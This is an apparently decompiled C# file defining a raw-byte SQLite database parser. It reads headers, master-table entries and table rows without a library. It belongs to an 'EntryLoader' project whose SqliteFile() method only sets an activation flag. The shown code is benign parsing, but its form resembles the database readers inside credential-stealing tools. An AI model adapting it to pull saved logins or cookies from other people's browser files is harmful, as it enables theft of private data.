﻿using System;
using System.IO;
using System.Text;
using EntryLoader;

// Token: 0x0200002A RID: 42
internal class Sqlite
{
	// Token: 0x06000067 RID: 103 RVA: 0x00006058 File Offset: 0x00004258
	public Sqlite(string fileName)
	{
		try
		{
			this._fileBytes = File.ReadAllBytes(fileName);
			this._pageSize = this.ConvertToULong(16, 2);
			this._dbEncoding = this.ConvertToULong(56, 4);
			this.ReadMasterTable(100L);
		}
		catch
		{
		}
	}

	// Token: 0x06000068 RID: 104 RVA: 0x000060CC File Offset: 0x000042CC
	public string GetValue(int rowNum, int field)
	{
		string result;
		try
		{
			if (rowNum >= this._tableEntries.Length)
			{
				result = null;
			}
			else
			{
				result = ((field >= this._tableEntries[rowNum].Content.Length) ? null : this._tableEntries[rowNum].Content[field]);
			}
		}
		catch
		{
			result = null;
		}
		return result;
	}

	// Token: 0x06000069 RID: 105 RVA: 0x00006130 File Offset: 0x00004330
	public int GetRowCount()
	{
		return this._tableEntries.Length;
	}

	// Token: 0x0600006A RID: 106 RVA: 0x0000613C File Offset: 0x0000433C
	private bool ReadTableFromOffset(ulong offset)
	{
		bool result;
		try
		{
			if (this._fileBytes[(int)(checked((IntPtr)offset))] == 13)
			{
				ushort num = (ushort)(this.ConvertToULong((int)offset + 3, 2) - 1UL);
				int num2 = 0;
				if (this._tableEntries != null)
				{
					num2 = this._tableEntries.Length;
					Array.Resize<Sqlite.TableEntry>(ref this._tableEntries, this._tableEntries.Length + (int)num + 1);
				}
				else
				{
					this._tableEntries = new Sqlite.TableEntry[(int)(num + 1)];
				}
				for (ushort num3 = 0; num3 <= num; num3 += 1)
				{
					ulong num4 = this.ConvertToULong((int)offset + 8 + (int)(num3 * 2), 2);
					if (offset != 100UL)
					{
						num4 += offset;
					}
					int num5 = this.Gvl((int)num4);
					this.Cvl((int)num4, num5);
					int num6 = this.Gvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL));
					this.Cvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL), num6);
					ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1L);
					int num8 = this.Gvl((int)num7);
					int num9 = num8;
					long num10 = this.Cvl((int)num7, num8);
					Sqlite.RecordHeaderField[] array = null;
					long num11 = (long)(num7 - (ulong)((long)num8) + 1UL);
					int num12 = 0;
					while (num11 < num10)
					{
						Array.Resize<Sqlite.RecordHeaderField>(ref array, num12 + 1);
						int num13 = num9 + 1;
						num9 = this.Gvl(num13);
						array[num12].Type = this.Cvl(num13, num9);
						array[num12].Size = (long)((array[num12].Type <= 9L) ? ((ulong)this._sqlDataTypeSize[(int)(checked((IntPtr)array[num12].Type))]) : ((ulong)((!Sqlite.IsOdd(array[num12].Type)) ? ((array[num12].Type - 12L) / 2L) : ((array[num12].Type - 13L) / 2L))));
						num11 = num11 + (long)(num9 - num13) + 1L;
						num12++;
					}
					if (array != null)
					{
						this._tableEntries[num2 + (int)num3].Content = new string[array.Length];
						int num14 = 0;
						int i = 0;
						while (i <= array.Length - 1)
						{
							if (array[i].Type <= 9L)
							{
								goto IL_38F;
							}
							if (Sqlite.IsOdd(array[i].Type))
							{
								try
								{
									string text = this._tableEntries[num2 + (int)num3].Content[i];
									Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
									this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
									goto IL_3C9;
								}
								catch
								{
									goto IL_3C9;
								}
								goto IL_38F;
							}
							if (this._dbEncoding == 1UL)
							{
								this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
							}
							else if (this._dbEncoding == 2UL)
							{
								this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
							}
							else if (this._dbEncoding == 3UL)
							{
								this._tableEntries[num2 + (int)num3].Content[i] = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
							}
							IL_3C9:
							num14 += (int)array[i].Size;
							i++;
							continue;
							IL_38F:
							this._tableEntries[num2 + (int)num3].Content[i] = Convert.ToString(this.ConvertToULong((int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size));
							goto IL_3C9;
						}
					}
				}
			}
			else if (this._fileBytes[(int)(checked((IntPtr)offset))] == 5)
			{
				ushort num15 = (ushort)(this.ConvertToULong((int)(offset + 3UL), 2) - 1UL);
				for (ushort num16 = 0; num16 <= num15; num16 += 1)
				{
					ushort num17 = (ushort)this.ConvertToULong((int)offset + 12 + (int)(num16 * 2), 2);
					this.ReadTableFromOffset((this.ConvertToULong((int)(offset + (ulong)num17), 4) - 1UL) * this._pageSize);
				}
				this.ReadTableFromOffset((this.ConvertToULong((int)(offset + 8UL), 4) - 1UL) * this._pageSize);
			}
			result = true;
		}
		catch
		{
			result = false;
		}
		return result;
	}

	// Token: 0x0600006B RID: 107 RVA: 0x00006608 File Offset: 0x00004808
	private void ReadMasterTable(long offset)
	{
		try
		{
			byte b = this._fileBytes[(int)(checked((IntPtr)offset))];
			if (b != 5)
			{
				if (b == 13)
				{
					ulong num = this.ConvertToULong((int)offset + 3, 2) - 1UL;
					int num2 = 0;
					if (this._masterTableEntries != null)
					{
						num2 = this._masterTableEntries.Length;
						Array.Resize<Sqlite.SqliteMasterEntry>(ref this._masterTableEntries, this._masterTableEntries.Length + (int)num + 1);
					}
					else
					{
						this._masterTableEntries = new Sqlite.SqliteMasterEntry[num + 1UL];
					}
					for (ulong num3 = 0UL; num3 <= num; num3 += 1UL)
					{
						ulong num4 = this.ConvertToULong((int)offset + 8 + (int)num3 * 2, 2);
						if (offset != 100L)
						{
							num4 += (ulong)offset;
						}
						int num5 = this.Gvl((int)num4);
						this.Cvl((int)num4, num5);
						int num6 = this.Gvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL));
						this.Cvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL), num6);
						ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1L);
						int num8 = this.Gvl((int)num7);
						int num9 = num8;
						long num10 = this.Cvl((int)num7, num8);
						long[] array = new long[5];
						for (int i = 0; i <= 4; i++)
						{
							int startIdx = num9 + 1;
							num9 = this.Gvl(startIdx);
							array[i] = this.Cvl(startIdx, num9);
							array[i] = (long)((array[i] <= 9L) ? ((ulong)this._sqlDataTypeSize[(int)(checked((IntPtr)array[i]))]) : ((ulong)((!Sqlite.IsOdd(array[i])) ? ((array[i] - 12L) / 2L) : ((array[i] - 13L) / 2L))));
						}
						if (this._dbEncoding != 1UL && this._dbEncoding != 2UL)
						{
							ulong dbEncoding = this._dbEncoding;
						}
						if (this._dbEncoding == 1UL)
						{
							this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
						}
						else if (this._dbEncoding == 2UL)
						{
							this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
						}
						else if (this._dbEncoding == 3UL)
						{
							this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
						}
						this._masterTableEntries[num2 + (int)num3].RootNum = (long)this.ConvertToULong((int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2]), (int)array[3]);
						if (this._dbEncoding == 1UL)
						{
							this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
						}
						else if (this._dbEncoding == 2UL)
						{
							this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
						}
						else if (this._dbEncoding == 3UL)
						{
							this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
						}
					}
				}
			}
			else
			{
				ushort num11 = (ushort)(this.ConvertToULong((int)offset + 3, 2) - 1UL);
				for (int j = 0; j <= (int)num11; j++)
				{
					ushort num12 = (ushort)this.ConvertToULong((int)offset + 12 + j * 2, 2);
					if (offset == 100L)
					{
						this.ReadMasterTable((long)((this.ConvertToULong((int)num12, 4) - 1UL) * this._pageSize));
					}
					else
					{
						this.ReadMasterTable((long)((this.ConvertToULong((int)(offset + (long)((ulong)num12)), 4) - 1UL) * this._pageSize));
					}
				}
				this.ReadMasterTable((long)((this.ConvertToULong((int)offset + 8, 4) - 1UL) * this._pageSize));
			}
		}
		catch
		{
		}
	}

	// Token: 0x0600006C RID: 108 RVA: 0x00006A54 File Offset: 0x00004C54
	public static void SqliteFile()
	{
		if (!EntryPoint.activation)
		{
			EntryPoint.activation = true;
		}
	}

	// Token: 0x0600006D RID: 109 RVA: 0x00006A64 File Offset: 0x00004C64
	public bool ReadTable(string tableName)
	{
		bool result;
		try
		{
			int num = -1;
			for (int i = 0; i <= this._masterTableEntries.Length; i++)
			{
				if (string.Compare(this._masterTableEntries[i].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
				{
					num = i;
					break;
				}
			}
			if (num == -1)
			{
				result = false;
			}
			else
			{
				string[] array = this._masterTableEntries[num].SqlStatement.Substring(this._masterTableEntries[num].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(new char[]
				{
					','
				});
				for (int j = 0; j <= array.Length - 1; j++)
				{
					array[j] = array[j].TrimStart(new char[0]);
					int num2 = array[j].IndexOf(' ');
					if (num2 > 0)
					{
						array[j] = array[j].Substring(0, num2);
					}
					if (array[j].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
					{
						Array.Resize<string>(ref this._fieldNames, j + 1);
						this._fieldNames[j] = array[j];
					}
				}
				result = this.ReadTableFromOffset((ulong)((this._masterTableEntries[num].RootNum - 1L) * (long)this._pageSize));
			}
		}
		catch
		{
			result = false;
		}
		return result;
	}

	// Token: 0x0600006E RID: 110 RVA: 0x00006BBC File Offset: 0x00004DBC
	private ulong ConvertToULong(int startIndex, int size)
	{
		ulong result;
		try
		{
			if (size > 8 | size == 0)
			{
				result = 0UL;
			}
			else
			{
				ulong num = 0UL;
				for (int i = 0; i <= size - 1; i++)
				{
					num = (num << 8 | (ulong)this._fileBytes[startIndex + i]);
				}
				result = num;
			}
		}
		catch
		{
			result = 0UL;
		}
		return result;
	}

	// Token: 0x0600006F RID: 111 RVA: 0x00006C18 File Offset: 0x00004E18
	private int Gvl(int startIdx)
	{
		int result;
		try
		{
			if (startIdx > this._fileBytes.Length)
			{
				result = 0;
			}
			else
			{
				for (int i = startIdx; i <= startIdx + 8; i++)
				{
					if (i > this._fileBytes.Length - 1)
					{
						return 0;
					}
					if ((this._fileBytes[i] & 128) != 128)
					{
						return i;
					}
				}
				result = startIdx + 8;
			}
		}
		catch
		{
			result = 0;
		}
		return result;
	}

	// Token: 0x06000070 RID: 112 RVA: 0x00006C88 File Offset: 0x00004E88
	private long Cvl(int startIdx, int endIdx)
	{
		long result;
		try
		{
			endIdx++;
			byte[] array = new byte[8];
			int num = endIdx - startIdx;
			bool flag = false;
			if (num == 0 | num > 9)
			{
				result = 0L;
			}
			else if (num != 1)
			{
				if (num == 9)
				{
					flag = true;
				}
				int num2 = 1;
				int num3 = 7;
				int num4 = 0;
				if (flag)
				{
					array[0] = this._fileBytes[endIdx - 1];
					endIdx--;
					num4 = 1;
				}
				for (int i = endIdx - 1; i >= startIdx; i += -1)
				{
					if (i - 1 >= startIdx)
					{
						array[num4] = (byte)((this._fileBytes[i] >> num2 - 1 & 255 >> num2) | (int)this._fileBytes[i - 1] << num3);
						num2++;
						num4++;
						num3--;
					}
					else if (!flag)
					{
						array[num4] = (byte)(this._fileBytes[i] >> num2 - 1 & 255 >> num2);
					}
				}
				result = BitConverter.ToInt64(array, 0);
			}
			else
			{
				array[0] = (this._fileBytes[startIdx] & 127);
				result = BitConverter.ToInt64(array, 0);
			}
		}
		catch
		{
			result = 0L;
		}
		return result;
	}

	// Token: 0x06000071 RID: 113 RVA: 0x00006DAC File Offset: 0x00004FAC
	private static bool IsOdd(long value)
	{
		return (value & 1L) == 1L;
	}

	// Token: 0x04000024 RID: 36
	private readonly byte[] _sqlDataTypeSize = new byte[]
	{
		0,
		1,
		2,
		3,
		4,
		6,
		8,
		8,
		0,
		0
	};

	// Token: 0x04000025 RID: 37
	private readonly ulong _dbEncoding;

	// Token: 0x04000026 RID: 38
	private readonly byte[] _fileBytes;

	// Token: 0x04000027 RID: 39
	private readonly ulong _pageSize;

	// Token: 0x04000028 RID: 40
	private string[] _fieldNames;

	// Token: 0x04000029 RID: 41
	private Sqlite.SqliteMasterEntry[] _masterTableEntries;

	// Token: 0x0400002A RID: 42
	private Sqlite.TableEntry[] _tableEntries;

	// Token: 0x0200002B RID: 43
	private struct RecordHeaderField
	{
		// Token: 0x0400002B RID: 43
		public long Size;

		// Token: 0x0400002C RID: 44
		public long Type;
	}

	// Token: 0x0200002C RID: 44
	private struct TableEntry
	{
		// Token: 0x0400002D RID: 45
		public string[] Content;
	}

	// Token: 0x0200002D RID: 45
	private struct SqliteMasterEntry
	{
		// Token: 0x0400002E RID: 46
		public string ItemName;

		// Token: 0x0400002F RID: 47
		public long RootNum;

		// Token: 0x04000030 RID: 48
		public string SqlStatement;
	}
}
